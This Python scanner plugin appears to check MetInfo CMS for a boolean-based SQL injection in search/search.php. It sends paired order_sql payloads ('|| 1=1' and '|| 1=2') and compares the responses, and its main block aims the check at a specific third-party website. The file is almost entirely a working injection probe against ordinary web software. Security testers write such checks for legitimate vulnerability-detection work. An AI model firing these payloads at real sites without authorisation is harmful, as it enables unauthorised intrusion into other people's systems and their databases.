#!/usr/bin/python
#-*- encoding:utf-8 -*-
#__author__ = '1c3z'
#ref http://wooyun.org/bugs/wooyun-2010-0121480

def assign(service, arg):
    if service == "metinfo":
        return True, arg


def audit(arg):
    payload1 = 'search/search.php?&searchtype=1&searchword=a283e9d11ea180bc7a360e9f1a833e51&module=5&lang=cn&order_sql=%20||%201=1%20'
    payload2 = 'search/search.php?&searchtype=1&searchword=a283e9d11ea180bc7a360e9f1a833e51&module=5&lang=cn&order_sql=%20||%201=2%20'
    url1 = arg + payload1
    url2 = arg + payload2
    test = '<em style=\'font-style:normal;\'>a283e9d11ea180bc7a360e9f1a833e51</em>'
    test4 = '<font color=red>a283e9d11ea180bc7a360e9f1a833e51</font>'
    code, head,res1, errcode, _ = curl.curl2(url1)
    code, head,res2, errcode, _ = curl.curl2(url2)

    if code == 200 and test not in res1 and test in res2:
        security_hole(url1)
        return
    if code == 200 and test4 not in res1 and test4 in res2:
        security_hole(url1)                    
if __name__ == '__main__':
    from dummy import *
    audit(assign('metinfo', 'http://www.10sr.com/')[1])